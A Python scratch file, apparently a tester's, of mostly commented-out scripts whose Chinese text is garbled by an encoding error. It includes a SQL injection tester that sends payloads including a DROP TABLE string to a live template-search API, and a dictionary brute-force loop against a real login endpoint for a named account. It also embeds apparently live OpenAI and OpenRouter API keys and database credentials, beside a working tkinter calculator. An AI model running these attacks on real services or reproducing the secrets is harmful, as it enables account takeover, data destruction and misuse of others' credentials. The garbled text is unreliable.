import signal

# -----------------------------------------------------------------------------------------------------鎼滅储妗哠QL娉ㄥ叆瀹夊叏娴嬭瘯
# import requests
# import time
#
# # 鎺ュ彛鍦板潃
# url = "https://api.wps.editorup.com/api/v1/resource/templates"
#
# # SQL娉ㄥ叆娴嬭瘯payloads
# sql_payloads = {
#     "鍩虹SQL娉ㄥ叆": "' OR '1'='1",
#     "甯冨皵鍨婼QL娉ㄥ叆": "' OR '1'='1' --",
#     "鑱斿悎鏌ヨSQL娉ㄥ叆": "' UNION SELECT null, null --",
#     "鏃堕棿寤惰繜SQL娉ㄥ叆": "' OR IF(1=1, SLEEP(5), 0) --",
#     "閿欒淇℃伅SQL娉ㄥ叆": "' OR 1=1; DROP TABLE users; --",
#     "宓屽鏌ヨSQL娉ㄥ叆": "' OR (SELECT COUNT(*) FROM users) > 0 --"
# }
#
# # 璇锋眰澶?# headers = {
#     "Accept": "application/json, text/plain, */*",
#     "User-Agent": "Mozilla/5.0",
#     "Origin": "https://api.wps.editorup.com",
#     "Referer": "https://api.wps.editorup.com/"
# }
#
# # SQL閿欒鍏抽敭璇?# dishu0 = ["sql syntax", "mysql", "syntax error", "warning", "unterminated", "ORA-", "native client"]
#
# # 娴嬭瘯鍑芥暟
# def test_sql_injection():
#     print("======== SQL 娉ㄥ叆瀹夊叏娴嬭瘯鎶ュ憡 ========\n")
#
#     for test_type, payload in sql_payloads.items():
#         params = {
#             "keyword": payload,
#             "tags": "",
#             "sortBy": "default",
#             "priceStrategy": "all",
#             "page": 1,
#             "limit": 10
#         }
#
#         print(f"馃攳 娴嬭瘯绫诲瀷锛歿test_type}")
#         print(f"馃И 娉ㄥ叆Payload锛歿payload}")
#
#         start_time = time.time()
#         try:
#             response = requests.get(url, params=params, headers=headers, timeout=10)
#             elapsed = time.time() - start_time
#
#             # 妫€鏌ョ偣
#             dishu_aitubiao = response.status_code == 200
#             dishu1 = any(keyword in response.text.lower() for keyword in dishu0)
#             dishu2 = "鏃堕棿寤惰繜" in test_type and elapsed > 4.5
#
#             # 鍒ゆ柇娴嬭瘯鏄惁閫氳繃
#             if not dishu_aitubiao:
#                 result = "鉂?Fail锛堢姸鎬佺爜寮傚父锛?
#             elif dishu1:
#                 result = "鉂?Fail锛堢枒浼糞QL閿欒淇℃伅娉勯湶锛?
#             elif dishu2:
#                 result = "鉂?Fail锛堢枒浼兼椂闂存敞鍏ユ紡娲烇級"
#             else:
#                 result = "鉁?Pass锛堟湭妫€娴嬪埌娉ㄥ叆杩硅薄锛?
#
#             # 鎵撳嵃缁撴灉
#             print(f"馃搫 鐘舵€佺爜锛歿response.status_code}")
#             print(f"鈴憋笍 鍝嶅簲鏃堕棿锛歿elapsed:.2f} 绉?)
#             print(f"馃Н 閿欒淇℃伅妫€娴嬶細{'鏄? if dishu1 else '鍚?}")
#             print(f"馃敋 娴嬭瘯缁撴灉锛歿result}")
#             print("-" * 50)
#
#         except requests.exceptions.Timeout:
#             print("鉂?Fail锛堣姹傝秴鏃讹紝鐤戜技琚玈LEEP娉ㄥ叆锛?)
#             print("-" * 50)
#         except Exception as e:
#             print(f"鈿狅笍 寮傚父鍙戠敓锛歿e}")
#             print("-" * 50)
#
# if __name__ == "__main__":
#     test_sql_injection()



# # -----------------------------------------------------------------------------------------------------------娴嬭瘯琛ㄦ牸鐢熸垚
# import pandas as pd
# import numpy as np
# import os
#
# # 鐢ㄦ埛杈撳叆
# num_rows = 100000
# num_cols = 20
# save_path = r"G:\teble"
# file_name = "generated_table.xlsx"
#
# # 鐢熸垚琛ㄦ牸鏁版嵁锛堢敤鏁板瓧濉厖锛屼粠1閫掑锛?# data = np.arange(1, num_rows * num_cols + 1).reshape((num_rows, num_cols))
#
# # 鍒涘缓DataFrame
# df = pd.DataFrame(data, columns=[f"鍒梴i+1}" for i in range(num_cols)])
#
# # 纭繚淇濆瓨璺緞瀛樺湪
# os.makedirs(save_path, exist_ok=True)
#
# # 淇濆瓨鍒癊xcel
# full_path = os.path.join(save_path, file_name)
# df.to_excel(full_path, index=False)
#
# print(f"琛ㄦ牸宸叉垚鍔熶繚瀛樺埌锛歿full_path}")



# -------------------------------------------------------------------------------------------------------------鐢熸垚娴嬭瘯鍥剧墖

# import os
# import io
# import math
# from PIL import Image, ImageDraw, ImageFont
# import numpy as np
#
# SAVE_DIR = "G:/picture"
# os.makedirs(SAVE_DIR, exist_ok=True)
#
# SUPPORTED_FORMATS = [
#     "BMP", "PNG", "JPEG", "TIFF", "WEBP", "GIF", "ICO", "PDF"
# ]
#
# def normalize_format(fmt):
#     fmt = fmt.upper()
#     if fmt == "JPG":
#         return "JPEG"
#     return fmt
#
# # True 娣诲姞姘村嵃锛孎alse 涓嶅姞姘村嵃
# shuiyin = True
# # shuiyin = False
#
# def draw_text_on_image(img, text="闀濇暟", opacity=30, enable_watermark=True):
#     if not enable_watermark:
#         return img.convert("RGB")
#
#     img = img.convert("RGBA")
#     watermark = Image.new("RGBA", img.size, (0, 0, 0, 0))
#     draw = ImageDraw.Draw(watermark)
#
#     font_path = "C:/Windows/Fonts/msyh.ttc"
#     font_size = int(min(img.size) * 0.25)
#     try:
#         font = ImageFont.truetype(font_path, font_size)
#     except:
#         print("鈿狅笍 瀛椾綋鍔犺浇澶辫触锛屼娇鐢ㄩ粯璁ゅ瓧浣?)
#         font = ImageFont.load_default()
#
#     text_bbox = draw.textbbox((0, 0), text, font=font)
#     text_width = text_bbox[2] - text_bbox[0]
#     text_height = text_bbox[3] - text_bbox[1]
#
#     position = ((img.size[0] - text_width) // 2, (img.size[1] - text_height) // 2)
#
#     shadow_offset = 2
#     draw.text((position[0] + shadow_offset, position[1] + shadow_offset), text, font=font, fill=(0, 0, 0, opacity // 2))
#     draw.text(position, text, font=font, fill=(255, 255, 255, opacity))
#
#     combined = Image.alpha_composite(img, watermark)
#     return combined.convert("RGB")
#
# def generate_image(target_mb, image_format="PNG", tolerance_plus_mb=0.1, enable_watermark=True):
#     target_bytes = target_mb * 1024 * 1024
#     max_bytes = target_bytes + tolerance_plus_mb * 1024 * 1024
#
#     filename_size = str(target_mb).replace(".", "_")
#     ext = image_format.upper()
#     filename = f"{filename_size}MB_{ext}.{ext.lower()}"
#     output_path = os.path.join(SAVE_DIR, filename)
#
#     def get_image_bytes(side):
#         array = np.random.randint(0, 256, (side, side, 3), dtype=np.uint8)
#         img = Image.fromarray(array)
#         img = draw_text_on_image(img, enable_watermark=enable_watermark)
#         with io.BytesIO() as buffer:
#             save_args = {"format": image_format}
#             if image_format == "JPEG":
#                 save_args["quality"] = 95
#             img.save(buffer, **save_args)
#             return buffer.getvalue()
#
#     if image_format == "PDF":
#         # PDF 鍥哄畾澶у皬
#         side = 1024
#         array = np.random.randint(0, 256, (side, side, 3), dtype=np.uint8)
#         img = Image.fromarray(array)
#         img = draw_text_on_image(img, enable_watermark=enable_watermark)
#         img.save(output_path, "PDF")
#         actual_size = os.path.getsize(output_path)
#
#     else:
#         # 鎵€鏈夋牸寮忥紙鍖呮嫭 BMP锛夌敤缁熶竴鐨勪及绠楀拰寰幆
#         test_side = 512
#         test_size_bytes = len(get_image_bytes(test_side))
#         bytes_per_pixel = test_size_bytes / (test_side ** 2)
#         est_side = int(math.sqrt(target_bytes / bytes_per_pixel))
#         print(f"\n鉃?[{image_format}] 浼扮畻鍒濆杈归暱锛歿est_side}锛堝弬鑰?{test_side}px 鈮?{test_size_bytes / 1024:.2f}KB锛?)
#
#         attempt = 0
#         side = est_side
#         final_data = None
#
#         while True:
#             data = get_image_bytes(side)
#             size = len(data)
#             size_mb = size / (1024 * 1024)
#             attempt += 1
#             print(f"灏濊瘯 {attempt}: 杈归暱={side}, 澶у皬={size_mb:.4f} MB")
#
#             if size >= target_bytes:
#                 final_data = data
#                 break
#             side += 10
#
#         with open(output_path, "wb") as f:
#             f.write(final_data)
#
#         actual_size = os.path.getsize(output_path)
#
#     print(f"\n鉁?鍥剧墖鐢熸垚鎴愬姛锛?)
#     print(f"鏍煎紡锛歿image_format}")
#     print(f"鐩爣澶у皬锛歿target_mb:.1f} MB")
#     print(f"鍏佽鏈€澶уぇ灏忥細{target_mb + tolerance_plus_mb:.2f} MB")
#     print(f"瀹為檯澶у皬锛歿actual_size / (1024 * 1024):.2f} MB")
#     print(f"璺緞锛歿output_path}\n")
#
# if __name__ == "__main__":
#     print(f"鏀寔鏍煎紡锛歿', '.join(SUPPORTED_FORMATS)}")
#     fmt_input = input("璇疯緭鍏ュ浘鐗囨牸寮忥紙澶氫釜鏍煎紡鐢ㄩ€楀彿鎴栫┖鏍煎垎闅旓紝榛樿 PNG锛夛細").strip()
#     if not fmt_input:
#         formats = ["PNG"]
#     else:
#         fmt_list = [s.strip() for s in fmt_input.replace(",", " ").split()]
#         formats = []
#         for f in fmt_list:
#             nf = normalize_format(f)
#             if nf not in SUPPORTED_FORMATS:
#                 print(f"鉂?涓嶆敮鎸佺殑鏍煎紡锛歿nf}锛屽凡璺宠繃")
#             else:
#                 formats.append(nf)
#         if not formats:
#             print("鉂?娌℃湁鏈夋晥鐨勫浘鐗囨牸寮忥紝绋嬪簭閫€鍑?)
#             exit(1)
#
#     size_input = input("璇疯緭鍏ョ洰鏍囧ぇ灏忥紙鍗曚綅 MB锛岄粯璁?5锛夛細").strip() or "5"
#     try:
#         size_mb = float(size_input)
#     except ValueError:
#         print("鉂?澶у皬蹇呴』鏄暟瀛楋紙鏀寔鏁存暟鎴栦竴浣嶅皬鏁帮級锛?)
#         exit(1)
#
#     for fmt in formats:
#         generate_image(size_mb, fmt, tolerance_plus_mb=0.1, enable_watermark=shuiyin)



# ----------------------------------------------------------------------------------------------------------------瀵嗙爜鐮磋В

# import requests
# import time
# # 璐﹀彿
# account = "18888888888"
#
# # 瑕佹帓闄ょ殑瀵嗙爜
# excluded_passwords = {"123456"}
#
# # 浠庢湰鍦版枃浠惰鍙栧瘑鐮佸瓧鍏?# password_file_path = r"C:\Users\Administrator\Desktop\鐖卞浘琛╘passwords.txt"
# try:
#     with open(password_file_path, "r", encoding="utf-8") as f:
#         password_list = [line.strip() for line in f if line.strip() and line.strip() not in excluded_passwords]
# except Exception as e:
#     print(f"鉂?鏃犳硶璇诲彇瀵嗙爜瀛楀吀鏂囦欢: {e}")
#     exit(1)
#
# # 鐧诲綍鎺ュ彛 URL
# url = "https://api.editorup.com/api/v1/auth/credential/login"
#
# # 璇锋眰澶?# headers = {
#     "Content-Type": "application/json",
#     "Accept": "application/json"
# }
#
# # 瀵嗙爜灏濊瘯
# for passwd in password_list:
#     payload = {
#         "account": account,
#         "passwd": passwd
#     }
#
#     try:
#         response = requests.post(url, json=payload, headers=headers)
#         response_json = response.json()
#     except Exception as e:
#         print(f"鉂?缃戠粶寮傚父鎴栨牸寮忛敊璇? {e}")
#         continue
#
#     code = response_json.get("code")
#     status = response.status_code
#
#     print(f"灏濊瘯瀵嗙爜: {passwd} -> 鐘舵€佺爜: {status}, 杩斿洖鐮? {code}")
#
#     # 鍒ゆ柇鐧诲綍鏄惁鎴愬姛
#     if status == 201 and code == 0:
#         print("鉁?鐮磋В鎴愬姛!")
#         print("璐﹀彿:", account)
#         print("瀵嗙爜:", passwd)
#         break
#
#     time.sleep(0.1)
#
# else:
#     print("鉂?鎵€鏈夊瘑鐮佸皾璇曞け璐?)




# import openai
#
# client = openai.OpenAI(api_key="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")
#
# def ask_gpt(prompt: str, model="gpt-3.5-turbo"):
#     try:
#         response = client.chat.completions.create(
#             model=model,
#             messages=[{"role": "user", "content": prompt}]
#         )
#         return response.choices[0].message.content.strip()
#     except openai.RateLimitError:
#         return "鉂?璇锋眰澶辫触锛氬凡瓒呭嚭浣跨敤棰濆害锛岃妫€鏌ヤ綘鐨?OpenAI 璐﹀彿棰濆害銆?
#     except Exception as e:
#         return f"鉂?璇锋眰寮傚父锛歿str(e)}"
#
# # 绀轰緥
# question = "濡備綍鐢≒ython鍙戦€佸甫闄勪欢鐨勯偖浠讹紵"
# print("ChatGPT绛斿锛?, ask_gpt(question))




# ----------------------------------------------------------------------------------------------------------------openai
# import openai
#
# client = openai.OpenAI(
#     api_key="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",
#     base_url='https://openrouter.ai/api/v1'
# )
#
#
# response = client.chat.completions.create(
#     model="gpt-4o",
#     messages=[
#         {"role": "system", "content": "浣犳槸涓€涓姪鎵?},
#         {"role": "user", "content": "鍐欎竴涓熀纭€鐨勮繍绠楄剼鏈?}
#     ]
# )
#
# print(response.choices[0].message.content)
#



# ---------------------------------------------------------------------------------------------------------淇敼618娲诲姩鏃堕棿
# import json
# import psycopg2
# import datetime
# import pytz   # pip install pytz
#
# # 鈹€鈹€ 鏄惁寮€鍚氦浜掓椂闂磋缃?鈹€鈹€
# # use_interactive = True  # 鉁?True 琛ㄧず寮€鍚氦浜掞紱False 琛ㄧず浣跨敤鍥哄畾鏃堕棿 10:00
# use_interactive = False
# # 鈹€鈹€ 鏁版嵁搴撹繛鎺ヤ俊鎭?鈹€鈹€
# conn_info = {
#     "host": "gate.editorup.com",
#     "port": 55432,
#     "user": "lmj#pg-for-test",
#     "password": "test2025",
#     "dbname": "core",
# }
#
# # 鈹€鈹€ 鑾峰彇褰撳墠鏂板姞鍧℃椂闂?鈹€鈹€
# sg_tz = pytz.timezone("Asia/Singapore")
# now   = datetime.datetime.now(sg_tz)
#
# # 鈹€鈹€ 浜や簰妯″紡涓嬪鐞嗘椂闂?鈹€鈹€
# if use_interactive:
#     print("\n璇烽€夋嫨 flashPoints[0] 鐨勬椂闂寸偣锛?)
#     print("  1. 鍓嶄竴")
#     print("  2. 褰撳墠")
#     print("  3. 鍚庝竴")
#     print("  4. 鑷畾涔?)
#
#     choice = input("杈撳叆閫夐」 (1/2/3/4)锛?).strip()
#
#     if choice == "1":
#         target_time = now - datetime.timedelta(minutes=1)
#     elif choice == "3":
#         target_time = now + datetime.timedelta(minutes=1)
#     elif choice == "4":
#         try:
#             offset = int(input("寤惰繜锛?).strip())
#             target_time = now + datetime.timedelta(minutes=offset)
#         except ValueError:
#             print("鈿狅笍 鏃犳晥锛岄粯璁や娇鐢ㄥ綋鍓嶆椂闂淬€?)
#             target_time = now
#     else:
#         target_time = now  # 榛樿褰撳墠鏃堕棿
#
#     hour, minute = target_time.hour, target_time.minute
#     print(f"\n鈫?flashPoints[0] 涓?{hour:02d}:{minute:02d}\n")
# else:
#     # 闈炰氦浜掓ā寮忥細浣跨敤鍥哄畾鏃堕棿 10:00
#     hour, minute = 10, 0
#     print(f"\n鈫?闈炰氦浜掓ā寮忥紝flashPoints[0] 璁剧疆涓?{hour:02d}:{minute:02d}\n")
#
# # 鈹€鈹€ 鏋勫缓 config 閰嶇疆 鈹€鈹€
# config = {
#     "pay": {
#         "imageSrc": "https://cdn.aitubiao.com/static/images/activity/20250618/pay-dialog-bg.png",
#         "orderColor": "#4C36D3",
#     },
#     "popup": False,
#     "banner": {
#         "link": "https://dev.editorup.com/activity/618",
#         "backgroundImage": "https://cdn.aitubiao.com/static/images/activity/20250618/banner-background.png",
#         "foregroundImage": "https://cdn.aitubiao.com/static/images/activity/20250618/banner-foreground.png",
#     },
#     "h5Banner": {
#         "webLink": "https://dev.editorup.com/activity/618",
#         "imageUrl": "https://cdn.aitubiao.com/static/images/activity/20250618/h5-banner.png",
#     },
#     "flashPoints": [
#         {"point": {"hour": hour, "minute": minute}, "duration": 60},
#         {"point": {"hour": 18,  "minute": 0},       "duration": 60},
#     ],
# }
#
# # 鈹€鈹€ 鏁版嵁搴撴洿鏂?鈹€鈹€
# with psycopg2.connect(**conn_info) as conn, conn.cursor() as cur:
#     cur.execute(
#         """
#         UPDATE activity.activity_config
#         SET    config = %s
#         WHERE  id     = %s
#         """,
#         (json.dumps(config), "828d531d-e0c1-49ad-96ce-ec01cd9b4a46"),
#     )
#     conn.commit()
#
# print("鉁?鏇存柊瀹屾垚")






# import requests
# import time
# from urllib.parse import quote_plus  # 閬垮厤涓枃鏍囬鎵嬪姩 urlencode
#
# LIST_URL = "https://api.editorup.com/api/v1/resource/templates"
# SEARCH_URL = "https://api.editorup.com/api/v1/resource/templates"  # 鍚屼竴涓帴鍙ｏ紝闈?keyword 绛涢€?#
# headers = {
#     "Accept": "application/json, text/plain, */*",
#     "Origin": "https://dev.editorup.com",
#     "Referer": "https://dev.editorup.com/",
#     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
# }
#
# limit = 100  # 鍒楄〃椤靛ぇ灏?# delay = 0.15  # 姣忔鎼滅储鐨勯棿闅旓紝閬垮厤瑙﹀彂闄愭祦
# page = 1
# total = 1
# templates = []  # 鎵€鏈夋ā鏉垮厓鏁版嵁
# duplicates = []  # [(title, [id1, id2, ...])]
#
# # 鈶?鎷夊彇妯℃澘鍒楄〃
# while (page - 1) * limit < total:
#     params = {
#         "sortBy": "default",
#         "page": page,
#         "limit": limit,
#         "tags": ""
#     }
#     resp = requests.get(LIST_URL, params=params, headers=headers)
#     resp.raise_for_status()
#
#     data_json = resp.json()
#     if data_json["code"] != 0:
#         raise RuntimeError(f"鍒楄〃鎺ュ彛閿欒锛歿data_json}")
#
#     batch = data_json["data"]["list"]
#     total = data_json["data"]["total"]
#
#     print(f"馃摜 绗?{page} 椤碉細{len(batch)} 鏉★紙绱 {len(templates) + len(batch)}/{total}锛?)
#     templates.extend(batch)
#     page += 1
#
# print(f"\n鉁?妯℃澘鍒楄〃鎷夊彇瀹屾瘯锛屽叡 {len(templates)} 涓ā鏉縗n")
#
# # 鈶?閽堝姣忎釜妯℃澘鏍囬鎵ц鎼滅储鎺ュ彛
# print("馃攳 寮€濮嬫寜鏍囬妫€娴嬮噸澶嶆悳绱㈢粨鏋?...\n")
#
# for idx, tpl in enumerate(templates, 1):
#     title = tpl["title"]
#
#     params = {
#         "keyword": title,  # requests 鑷姩 urlencode锛屼篃鍙嚜宸?quote_plus
#         "tags": "",
#         "sortBy": "default",
#         "priceStrategy": "all",
#         "style": "all",
#         "page": 1,
#         "limit": 10
#     }
#     search_resp = requests.get(SEARCH_URL, params=params, headers=headers)
#     search_resp.raise_for_status()
#
#     sj = search_resp.json()
#     if sj["code"] != 0:
#         print(f"{idx:>3}/{len(templates)} 鉂?鎼滅储鎺ュ彛閿欒锛歿title}")
#         continue
#
#     result_list = sj["data"]["list"]
#     result_total = sj["data"]["total"]
#
#     if result_total > 1:  # 鍑虹幇閲嶅
#         dup_ids = [item["id"] for item in result_list]
#         print(f"{idx:>3}/{len(templates)} 鈿狅笍  閲嶅鏍囬 - 銆妠title}銆? 鎼滃埌 {result_total} 鏉?)
#         duplicates.append((title, dup_ids))
#     else:
#         print(f"{idx:>3}/{len(templates)} 鉁?鍞竴鏍囬 - 銆妠title}銆?)
#
#     time.sleep(delay)
#
# # 鈶?姹囨€?# print("\n==================  姹? 鎬? ==================")
# print(f"妯℃澘鎬绘暟               : {len(templates)}")
# print(f"鍑虹幇閲嶅鏍囬妯℃澘鏁?      : {len(duplicates)}")
#
# if duplicates:
#     print("\n馃搵 璇︾粏锛堥噸澶嶆爣棰橈級锛?)
#     for t, ids in duplicates:
#         print(f"  - 銆妠t}銆?-> 妯℃澘id: {', '.join(ids)}")





import tkinter as tk
from tkinter import messagebox

def on_click(char):
    entry_var.set(entry_var.get() + str(char))

def clear():
    entry_var.set("")

def calculate():
    try:
        result = eval(entry_var.get(), {"__builtins__": None}, {})
        entry_var.set(str(result))
    except ZeroDivisionError:
        messagebox.showerror("閿欒", "涓嶈兘闄や互 0")
    except Exception:
        messagebox.showerror("閿欒", "琛ㄨ揪寮忔棤鏁堬紝璇烽噸鏂拌緭鍏?)

# 鍒涘缓绐楀彛
root = tk.Tk()
root.title("鐐瑰嚮寮忚绠楀櫒")
root.geometry("300x400")

# 杈撳叆妗嗗彉閲?entry_var = tk.StringVar()

# 鏄剧ず妗?entry = tk.Entry(root, textvariable=entry_var, font=("Arial", 20), justify="right", bd=10)
entry.pack(fill="both", padx=10, pady=10)

# 鎸夐挳甯冨眬
buttons = [
    ['7', '8', '9', '/'],
    ['4', '5', '6', '*'],
    ['1', '2', '3', '-'],
    ['0', '.', 'C', '+'],
    ['=']
]

def create_buttons():
    for row in buttons:
        row_frame = tk.Frame(root)
        row_frame.pack(expand=True, fill="both")
        for btn in row:
            if btn == "=":
                tk.Button(row_frame, text=btn, font=("Arial", 18), bg="#4CAF50", fg="white",
                          command=calculate).pack(side="left", expand=True, fill="both")
            elif btn == "C":
                tk.Button(row_frame, text=btn, font=("Arial", 18), bg="#f44336", fg="white",
                          command=clear).pack(side="left", expand=True, fill="both")
            else:
                tk.Button(row_frame, text=btn, font=("Arial", 18),
                          command=lambda ch=btn: on_click(ch)).pack(side="left", expand=True, fill="both")

create_buttons()

# 鍚姩绋嬪簭
root.mainloop()





# 测试git01
